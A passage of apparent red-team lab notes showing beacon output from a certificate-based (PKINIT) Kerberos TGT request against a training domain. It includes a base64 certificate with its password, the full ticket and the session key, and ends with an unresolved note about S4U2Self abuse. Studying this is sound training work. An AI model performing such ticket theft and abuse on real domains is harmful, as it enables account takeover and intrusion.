rb7DbuYUr32Ll3GFJ94AfucXLLSzSBKK0v8EIWwgUTidwjKwVMw77Lmdp8DseSeOYtsodNd4gSgq8EJ/NLhnFMq102Ghs9IlMVKUEYRWddx4m9i2L9Xy9WITNbSDEcbOaaNLlnpe38lJUJPLGvZIdHnfJ3MRzr0TwiTzWMbjhxCTqm6ajaQmBVyuinPHbJ/Kl51q8yZKdVdg4GMh27wU6/p6fjiXRUZYYdW07iRphEDg9PSyV3Y07xEWegVYL/rz4dao/4drMJtpc6iiR9qT5t8fiLdQTo8zr3K+pMFsWP+d2+kIvw75kfJFVY7BnDKnL7dMVNO7fRnnF444jm3plMXAHIULnUUe7J46SVdn5dcaIMvYaG4O40YBKgWA91EDe1HSqsLR2UbEuTbEAKd/wszRa6bdGoSi4oo35bW7yQz+EijxlzHrECMBnMrRXTNqhBC6ophuE5FGFP0Ex6K0nkqj6HAQabiQHTxn96H5Vmd+qRHIZOEy2V9BUQecDuOq7mqu35XuW/aUOs41P6ukuCYRv4orHenZdH7x7rA7XV+tVVvJMNa1MX7o/oWfaN5TlXNDAJ0e6uZVjET8mA0fTOaGjOmWuMtQn25kucNzpiQoBbMGbqU9mIYhcAb+YA/MS+5/fddLMLSGRJy8secz8T2L+6T+gqJr2lwB3auHCnrFnXTpmG4pu0e+VKiSy4R0l25ylUNMGR8XO4GK9Ywljrjjz5eqRFs63lQIy6g5ExzdqNEtyasLT5sC75GSZZ1SggzU7LkSzJKK20185Ynco2aCRt6zByIKVQpdTKkp71+QWwb/zCzQhsL3C+q/WndNVI9LLbPCZ4oHMrskQBK8HVkxgZIwIwYJKoZIhvcNAQkVMRYEFKqU2hUpn4jsIQzD0e2/wMyovRAGMGsGCSsGAQQBgjcRATFeHlwATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAdgAxAC4AMDAxMCEwCQYFKw4DAhoFAAQUGwwR4t5aIwGqdVRkiek+sE9nsfMECISM+F4E2NzdAgIIAA== /password:pass123 /nowrap
[12/11 21:10:06] [+] host called home, sent: 559592 bytes
[12/11 21:10:07] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT


[12/11 21:10:08] [+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\nlamb'

[12/11 21:10:08] [+] received output:
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!

[12/11 21:10:08] [+] received output:
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  12/11/2023 9:10:08 PM
  EndTime                  :  12/12/2023 7:10:08 AM
  RenewTill                :  12/18/2023 9:10:08 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  IrRR/IDXekk+PFsVmryJkQ==
  ASREP (key)              :  043C5EFFF85B313096FF8B601F0A03AE


```
now that we have a `TGT` can use `S4U2Self`
- tried doing this, unsure how to abuse the `TGT`